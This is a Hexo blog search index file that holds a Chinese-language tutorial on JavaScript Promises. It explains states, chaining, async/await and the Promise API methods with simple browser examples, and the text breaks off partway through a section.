<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Promise</title>
      <link href="/2022/01/06/promise/"/>
      <url>/2022/01/06/promise/</url>
      
        <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><a id="more"></a><h2 id="1-什么是Promise"><a href="#1-什么是Promise" class="headerlink" title="1. 什么是Promise"></a>1. 什么是Promise</h2><h3 id="①-抽象表达"><a href="#①-抽象表达" class="headerlink" title="① 抽象表达"></a>① 抽象表达</h3><p> <strong>Promise</strong>是JS中进行异步编程新的解决方案</p><h3 id="②-具体表达"><a href="#②-具体表达" class="headerlink" title="② 具体表达"></a>② 具体表达</h3><p> (1) 从语法上来说: Promise 是一个构造函数<br> (2) 从功能上来说: promise 对象用来封装一个异步操作并可以获取其结果</p><h2 id="2-promise状态"><a href="#2-promise状态" class="headerlink" title="2. promise状态"></a>2. promise状态</h2><ol><li><p>pending 变为 resolved</p></li><li><p>pending 变为 rejected</p><p>说明: 只有这 2 种, 且一个 promise 对象只能改变一次,无论变为成功还是失败, 都会有一个结果数据<br>成功的结果数据一般称为 vlaue, 失败的结果数据一般称为 reason</p></li></ol><h2 id="3-promise的基本流程"><a href="#3-promise的基本流程" class="headerlink" title="3. promise的基本流程"></a>3. promise的基本流程</h2><p><img src="/promise/promise1.png"></p><h2 id="4-promise的基本使用"><a href="#4-promise的基本使用" class="headerlink" title="4. promise的基本使用"></a>4. promise的基本使用</h2> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"btn"</span><span class="token operator">></span>抽奖<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>  <span class="token keyword">function</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token parameter">m<span class="token punctuation">,</span>n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/*   点击按钮 2s显示是否中将   若中将弹出 中奖信息   若未中奖,弹出未中奖信息  */</span> <span class="token keyword">let</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#btn'</span><span class="token punctuation">)</span> <span class="token comment">//绑定单击响应函数</span> btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>   <span class="token comment">//* 定时器形式</span>  <span class="token comment">//  setTimeout(() => &#123;</span>  <span class="token comment">//    //1-100 30%中奖率</span>  <span class="token comment">//    let sjs = random(1,100)</span>  <span class="token comment">//    if(sjs &lt;= 30) &#123;</span>  <span class="token comment">//      alert('恭喜中奖,给你一个最爱的大嘴巴子')</span>  <span class="token comment">//    &#125; else &#123;</span>  <span class="token comment">//      alert('睡吧梦里都有')</span>  <span class="token comment">//    &#125;</span>  <span class="token comment">//  &#125;, 2000);</span>    <span class="token comment">//* Promise形式实现</span>  <span class="token comment">// resolve 函数形式</span>  <span class="token comment">// reject 函数形式</span>  <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> sjs <span class="token operator">=</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>sjs <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>sjs<span class="token punctuation">)</span>  <span class="token comment">//成功时回调 将promise状态修改为成功</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">reject</span><span class="token punctuation">(</span>sjs<span class="token punctuation">)</span>   <span class="token comment">//失败时回调 将promise状态修改为失败</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//调用then方法</span>  p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span> <span class="token comment">//成功时执行该回调</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">恭喜中奖,给你一个最爱的大嘴巴子,您的中将号码为:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span> <span class="token comment">//失败时执行该回调</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">睡吧梦里都有,您的号码为:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>reason<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="5-为什么要用Promise"><a href="#5-为什么要用Promise" class="headerlink" title="5. 为什么要用Promise"></a>5. 为什么要用Promise</h2><h3 id="①-指定回调函数的方式更加灵活"><a href="#①-指定回调函数的方式更加灵活" class="headerlink" title="① 指定回调函数的方式更加灵活"></a>① 指定回调函数的方式更加灵活</h3><ol><li>旧的(回调函数): 必须在启动异步任务前指定<pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token comment">// 成功的回调函数</span><span class="token keyword">function</span> <span class="token function">successCallback</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"声音文件创建成功: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 失败的回调函数</span><span class="token keyword">function</span> <span class="token function">failureCallback</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"声音文件创建失败: "</span> <span class="token operator">+</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">createAudioFileAsync</span><span class="token punctuation">(</span>audioSettings<span class="token punctuation">,</span> successCallback<span class="token punctuation">,</span> failureCallback<span class="token punctuation">)</span></code></pre></li><li>promise: 启动异步任务 =&gt; 返回promie对象 =&gt; 给promise对象绑定回调函数<br>(甚至可以在异步任务结束后指定/多个)<pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> promise <span class="token operator">=</span> <span class="token function">createAudioFileAsync</span><span class="token punctuation">(</span>audioSettings<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>successCallback<span class="token punctuation">,</span> failureCallback<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="②-支持链式调用-可以解决回调地狱问题"><a href="#②-支持链式调用-可以解决回调地狱问题" class="headerlink" title="② 支持链式调用, 可以解决回调地狱问题"></a>② 支持链式调用, 可以解决回调地狱问题</h3><p> Ⅰ、什么是回调地狱<br>  回调函数嵌套调用,外部回调函数异步执行的结果是嵌套的回调执行的条件<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">doSomethingElse</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">doThirdThing</span><span class="token punctuation">(</span>newResult<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">finalResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Got the final result: '</span> <span class="token operator">+</span> finalResult<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> failureCallback<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> failureCallback<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> failureCallback<span class="token punctuation">)</span></code></pre><br> Ⅱ、回调函数的缺点<br>  不便于阅读、不便于异常处理</p><p> Ⅲ、解决回调地狱方案<br>  Promise链式调用<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token function">doSomethingElse</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">newResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token function">doThirdThing</span><span class="token punctuation">(</span>newResult<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">finalResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Got the final result: '</span> <span class="token operator">+</span> finalResult<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span>failureCallback<span class="token punctuation">)</span></code></pre><br> Ⅳ、终极解决方案<br>  async/await<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">const</span> newResult <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">doSomethingElse</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>     <span class="token keyword">const</span> finalResult <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">doThirdThing</span><span class="token punctuation">(</span>newResult<span class="token punctuation">)</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Got the final result: '</span> <span class="token operator">+</span> finalResult<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">failureCallback</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></code></pre></p><h2 id="6-Promise-API"><a href="#6-Promise-API" class="headerlink" title="6. Promise API"></a>6. Promise API</h2><h3 id="①-Promise构造函数"><a href="#①-Promise构造函数" class="headerlink" title="① Promise构造函数"></a>① Promise构造函数</h3><p> (1) executor 函数: 执行器 (resolve, reject) =&gt; {}<br> (2) resolve 函数: 内部定义成功时我们调用的函数 value =&gt; {}<br> (3) reject 函数: 内部定义失败时我们调用的函数 reason =&gt; {}</p><p> 说明: <strong>executor 会在 Promise 内部立即同步调用</strong>,异步操作在执行器中执行</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">//*同步调用的</span>    <span class="token comment">// console.log(111)</span>    <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">// console.log(222)</span>  <span class="token comment">//调用catch方法</span>  p<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">reason</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="②-Promise-prototype-then-方法"><a href="#②-Promise-prototype-then-方法" class="headerlink" title="② Promise.prototype.then 方法"></a>② Promise.prototype.then 方法</h3><p> Promise.prototype.then (onResolved, onRejected) =&gt; {}</p><p> (1) onResolved 函数: 成功的回调函数 (value) =&gt; {}<br> (2) onRejected 函数: 失败的回调函数 (reason) =&gt; {}</p><p> 说明: 指定用于得到成功 value 的成功回调和用于得到失败 reason 的失败回调<br> 返回一个新的 promise 对象</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> sjs <span class="token operator">=</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>sjs <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>sjs<span class="token punctuation">)</span>  <span class="token comment">//成功时回调 将promise状态修改为成功</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">reject</span><span class="token punctuation">(</span>sjs<span class="token punctuation">)</span>   <span class="token comment">//失败时回调 将promise状态修改为失败</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//调用then方法</span>  p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span> <span class="token comment">//成功时执行该回调</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">恭喜中奖,给你一个最爱的大嘴巴子,您的中将号码为:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span> <span class="token comment">//失败时执行该回调</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">睡吧梦里都有,您的号码为:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>reason<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="③-Promise-prototype-catch-方法"><a href="#③-Promise-prototype-catch-方法" class="headerlink" title="③ Promise.prototype.catch 方法"></a>③ Promise.prototype.catch 方法</h3><p> Promise.prototype.catch (onRejected) =&gt; {}</p><p> (1) onRejected 函数: 失败的回调函数 (reason) =&gt; {}</p><p> 说明: then()的语法糖, 相当于: then(undefined, onRejected)</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">//*同步调用的</span>    <span class="token comment">// console.log(111)</span>    <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">// console.log(222)</span>  <span class="token comment">//调用catch方法</span>  p<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">reason</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="④-Promise-resolve-方法"><a href="#④-Promise-resolve-方法" class="headerlink" title="④ Promise.resolve 方法"></a>④ Promise.resolve 方法</h3><p> Promise.resolve (value) =&gt; {}</p><p> (1) value: 成功的数据或 promise 对象</p><p> 说明: 返回一个成功/失败的 promise 对象</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//如果传入的值为非Promise对象,则返回的结果为成功的Promise对象,</span>  <span class="token keyword">const</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'0824'</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token comment">//如果传入的值为 Promise对象,则参数的结果决定了resolve的结果</span>  <span class="token keyword">const</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Ok'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span>  <span class="token keyword">const</span> p3 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span></code></pre><h3 id="⑤-Promise-reject-方法"><a href="#⑤-Promise-reject-方法" class="headerlink" title="⑤ Promise.reject 方法"></a>⑤ Promise.reject 方法</h3><p> Promise.reject (reason) =&gt; {}</p><p> (1) reason: 失败的原因</p><p> 说明: 返回一个失败的 promise 对象</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//传任何值进去它返回的状态都是失败,返回的结果是传入的值</span><span class="token keyword">const</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token number">824</span><span class="token punctuation">)</span><span class="token comment">// console.log(p)</span><span class="token keyword">const</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'kobe'</span><span class="token punctuation">)</span><span class="token comment">// console.log(p2)</span><span class="token comment">//即使返回的是一个成功的Promise</span><span class="token keyword">const</span> p3 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span></code></pre><h3 id="⑥-Promise-all-方法"><a href="#⑥-Promise-all-方法" class="headerlink" title="⑥ Promise.all 方法"></a>⑥ Promise.all 方法</h3><p> Promise.all (promises) =&gt; {}</p><p> (1) promises: 包含 n 个 promise 的数组</p><p> 说明: 返回一个新的 promise, 只有所有的 promise 都成功才成功, 只要有一个失败了就<br> 直接失败</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">let</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'成功'</span><span class="token punctuation">)</span><span class="token comment">// let p3 = Promise.resolve('oh hello')</span><span class="token comment">//当数组中有一个Promise为失败的,则all方法返回的结果是失败的Promise对象,该对象的状态就是失败,该对象的结果值为Promise返回失败的结果值</span><span class="token keyword">let</span> p3 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token comment">//它的参数是一个Promise的数组</span><span class="token comment">//当数组中所有Promise都为成功,则all方法的返回结果是成功的Promise对象,该对象的状态为成功,该对象的结果值为Promise返回成功的结果值组成的数组</span><span class="token keyword">const</span> result <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p1<span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p3<span class="token punctuation">]</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h3 id="⑦-Promise-race-方法"><a href="#⑦-Promise-race-方法" class="headerlink" title="⑦ Promise.race 方法"></a>⑦ Promise.race 方法</h3><p> Promise.race (promises) =&gt; {}</p><p> (1) promises: 包含 n 个 promise 的数组</p><p> 说明: 返回一个新的 promise, 第一个完成的 promise 的结果状态就是最终的结果状态</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Ok'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">let</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Ok'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">let</span> p3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//* Promise.race 哪个promise最先执行完,返回的Promise对象就是最先执行完的promise返回结果</span><span class="token comment">//* race方法的状态由最先执行完的Promise返回结果的状态决定,race方法的结果由最先执行完的Promise返回结果的结果值决定</span><span class="token keyword">let</span> res <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p1<span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p3<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="7-Promise的几个关键问题"><a href="#7-Promise的几个关键问题" class="headerlink" title="7. Promise的几个关键问题"></a>7. Promise的几个关键问题</h2><h3 id="7-1-如何改变-promise-的状态"><a href="#7-1-如何改变-promise-的状态" class="headerlink" title="7.1 如何改变 promise 的状态?"></a>7.1 如何改变 promise 的状态?</h3><p> (1) resolve(value): 如果当前是 pending 就会变为 resolved</p><p> (2) reject(reason): 如果当前是 pending 就会变为 rejected</p><p> (3) 抛出异常: 如果当前是 pending 就会变为 rejected</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// resolve('OK')  //pending=> fulfilled 成功</span>    <span class="token comment">// reject('error')   //pending=>rejected 失败</span>    <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span> <span class="token comment">//pending=>rejected 失败</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="7-2-一个-promise指定多个成功-失败回调函数-都会调用吗"><a href="#7-2-一个-promise指定多个成功-失败回调函数-都会调用吗" class="headerlink" title="7.2 一个 promise指定多个成功/失败回调函数,都会调用吗?"></a>7.2 一个 promise指定多个成功/失败回调函数,都会调用吗?</h3><p> 当 promise 改变为对应状态时都会调用</p><h3 id="7-3-改变-promise-状态和指定回调函数谁先谁后"><a href="#7-3-改变-promise-状态和指定回调函数谁先谁后" class="headerlink" title="7.3 改变 promise 状态和指定回调函数谁先谁后?"></a>7.3 改变 promise 